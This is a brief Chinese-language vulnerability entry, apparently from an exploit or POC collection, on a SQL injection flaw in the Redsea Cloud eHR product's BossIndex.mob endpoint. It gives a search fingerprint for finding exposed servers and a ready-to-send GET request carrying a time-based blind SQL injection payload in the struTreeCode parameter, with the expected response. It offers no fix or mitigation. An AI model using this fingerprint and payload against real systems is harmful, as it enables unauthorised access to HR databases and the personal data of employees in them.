# 红海云eHRBossIndex.mob存在SQL注入漏洞

红海云eHRBossIndex.mob ｜ SQL注入 ｜ —
- **指纹**：`body="/RedseaPlatform/skins/images/favicon.ico"`
- **请求**：`GET /RedseaPlatform/BossIndex.mob?method=getNewStaffJoin&struTreeCode='+AND+(SELECT+3266+FROM+(SELECT(SLEEP(5)))ShXk)+AND+'qmyT'='qmyT HTTP/1.1`
- **响应特征**：200